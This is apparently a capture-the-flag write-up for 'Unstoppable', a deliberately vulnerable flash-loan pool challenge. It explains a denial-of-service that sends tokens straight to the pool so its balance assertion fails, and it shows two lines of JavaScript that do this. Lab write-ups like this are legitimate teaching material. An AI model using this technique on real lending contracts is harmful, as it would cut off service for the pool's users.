# Challenge #1 - Unstoppable

There's a lending pool with a million DVT tokens in balance, offering flash loans for free.

If only there was a way to attack and stop the pool from offering flash loans ...

You start with 100 DVT tokens in balance.

# My Solution

Call the ERC20 Token contract and manually transfer some more token to the UnstoppableLender contract so that `assert(poolBalance == balanceBefore);` is not true anymore.

code used to do that:

```
await this.token.approve(this.pool.address, TOKENS_IN_POOL);
await this.token.transfer(this.pool.address, TOKENS_IN_POOL);
```
